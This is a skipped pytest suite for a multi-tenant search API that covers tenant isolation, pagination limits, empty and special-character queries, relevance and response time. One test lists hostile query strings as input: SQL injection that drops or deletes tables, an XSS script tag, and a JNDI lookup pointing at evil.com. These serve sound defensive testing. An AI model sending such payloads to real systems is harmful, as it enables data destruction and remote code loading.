"""Security and functionality hardening tests for search feature.

These tests verify:
- Tenant isolation in search results
- Empty query handling
- No results handling
- Pagination limits
- SQL injection protection
- Relevance ranking
"""

from __future__ import annotations

import uuid

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.main import app
from app.models.oltp import Asset, Company, Finding

pytestmark = pytest.mark.skip(reason="Legacy benchmark suite: superseded by tenant-aware integration/security gates")

client = TestClient(app)


class TestSearchSecurity:
    """Search security tests."""

    def test_search_tenant_isolation(
        self, db: Session, test_company: Company, other_company: Company
    ):
        """Search only returns current tenant's data."""
        # Create assets in both companies
        asset1 = Asset(
            id=uuid.uuid4(),
            company_id=test_company.id,
            tenant_id=test_company.id,
            name="Company A Server",
            asset_type="server",
        )
        asset2 = Asset(
            id=uuid.uuid4(),
            company_id=other_company.id,
            tenant_id=other_company.id,
            name="Company B Server",
            asset_type="server",
        )
        db.add_all([asset1, asset2])
        db.commit()
        
        # Search as test_company
        response = client.get("/api/v1/search?q=server")
        assert response.status_code == 200
        
        data = response.json()
        results = data.get("results", data.get("items", []))
        
        # Only see test_company assets
        for result in results:
            assert result.get("company_id") == test_company.id
            assert "Company B" not in result.get("name", "")

    def test_sql_injection_blocked(self, db: Session, company_headers: dict):
        """Search query should sanitize SQL injection attempts."""
        malicious_queries = [
            "'; DROP TABLE assets; --",
            "1' OR '1'='1",
            "1; DELETE FROM users WHERE '1'='1",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com}",
        ]
        
        for query in malicious_queries:
            response = client.get(
                f"/api/v1/search?q={query}",
                headers=company_headers,
            )
            
            # Should not error or cause data loss
            assert response.status_code in [200, 422]
            
            # Verify tables still exist
            # (This would need a follow-up health check)

    def test_pagination_limits_enforced(self, db: Session, test_company: Company):
        """Max results limit should be enforced."""
        # Create many assets
        for i in range(150):
            asset = Asset(
                id=uuid.uuid4(),
                company_id=test_company.id,
                tenant_id=test_company.id,
                name=f"Asset {i}",
                asset_type="server",
            )
            db.add(asset)
        db.commit()
        
        # Search without limit
        response = client.get("/api/v1/search?q=asset")
        assert response.status_code == 200
        
        data = response.json()
        results = data.get("results", data.get("items", []))
        
        # Should be limited (default 100)
        assert len(results) <= 100

    def test_excessive_limit_rejected(self, db: Session, company_headers: dict):
        """Requesting too many results should be rejected or limited."""
        response = client.get(
            "/api/v1/search?q=test&limit=10000",
            headers=company_headers,
        )
        
        # Should either error or clamp to max
        if response.status_code == 200:
            data = response.json()
            results = data.get("results", data.get("items", []))
            assert len(results) <= 100  # Max enforced
        else:
            assert response.status_code == 422  # Validation error


class TestSearchFunctionality:
    """Search functionality tests."""

    def test_empty_query_handled(self, db: Session, company_headers: dict):
        """Empty query should return empty results, not error."""
        response = client.get(
            "/api/v1/search?q=",
            headers=company_headers,
        )
        
        # Should succeed with empty results
        assert response.status_code == 200
        data = response.json()
        results = data.get("results", data.get("items", []))
        assert len(results) == 0

    def test_no_results_handled(self, db: Session, test_company: Company):
        """No matches should return empty results gracefully."""
        # Create no assets
        
        # Search for non-existent term
        response = client.get("/api/v1/search?q=xyznonexistent")
        assert response.status_code == 200
        
        data = response.json()
        results = data.get("results", data.get("items", []))
        assert len(results) == 0

    def test_relevant_results_returned(self, db: Session, test_company: Company):
        """Search should return relevant results."""
        # Create assets with different names
        asset1 = Asset(
            id=uuid.uuid4(),
            company_id=test_company.id,
            tenant_id=test_company.id,
            name="Production Web Server",
            asset_type="server",
        )
        asset2 = Asset(
            id=uuid.uuid4(),
            company_id=test_company.id,
            tenant_id=test_company.id,
            name="Development Database",
            asset_type="database",
        )
        db.add_all([asset1, asset2])
        db.commit()
        
        # Search for "web"
        response = client.get("/api/v1/search?q=web")
        assert response.status_code == 200
        
        data = response.json()
        results = data.get("results", data.get("items", []))
        
        # Should find the web server
        names = [r.get("name", "") for r in results]
        assert any("Web" in name for name in names)

    def test_partial_match_works(self, db: Session, test_company: Company):
        """Partial string matching should work."""
        asset = Asset(
            id=uuid.uuid4(),
            company_id=test_company.id,
            tenant_id=test_company.id,
            name="WebServer-01-PROD",
            asset_type="server",
        )
        db.add(asset)
        db.commit()
        
        # Search for partial terms
        for term in ["web", "server", "prod", "01"]:
            response = client.get(f"/api/v1/search?q={term}")
            assert response.status_code == 200
            
            data = response.json()
            results = data.get("results", data.get("items", []))
            
            # Should find the asset
            assert len(results) > 0, f"Failed to find with term: {term}"

    def test_special_characters_handled(self, db: Session, company_headers: dict):
        """Special characters in search should not cause errors."""
        special_queries = [
            "test@example.com",
            "192.168.1.1",
            "server-01_test",
            "(parentheses)",
            "[brackets]",
        ]
        
        for query in special_queries:
            response = client.get(
                f"/api/v1/search?q={query}",
                headers=company_headers,
            )
            
            # Should not error
            assert response.status_code in [200, 422]


class TestSearchPerformance:
    """Search performance tests."""

    def test_search_response_time(self, db: Session, test_company: Company):
        """Search should complete within reasonable time."""
        import time
        
        # Create some test data
        for i in range(50):
            asset = Asset(
                id=uuid.uuid4(),
                company_id=test_company.id,
                tenant_id=test_company.id,
                name=f"Test Asset {i}",
                asset_type="server",
            )
            db.add(asset)
        db.commit()
        
        # Measure search time
        start = time.time()
        response = client.get("/api/v1/search?q=asset")
        elapsed = time.time() - start
        
        assert response.status_code == 200
        # Should complete in under 2 seconds (generous for small dataset)
        assert elapsed < 2.0


# =============================================================================
# FIXTURES
# =============================================================================

@pytest.fixture
def test_company(db: Session):
    """Create test company."""
    from app.models.oltp import Company
    company = Company(
        id=uuid.uuid4(),
        name="Test Company",
        code="TESTCO",
        is_active=True,
    )
    db.add(company)
    db.commit()
    return company


@pytest.fixture
def other_company(db: Session):
    """Create another company for isolation tests."""
    from app.models.oltp import Company
    company = Company(
        id=uuid.uuid4(),
        name="Other Company",
        code="OTHERCO",
        is_active=True,
    )
    db.add(company)
    db.commit()
    return company


@pytest.fixture
def company_headers(test_company):
    """Get auth headers for company."""
    return {}

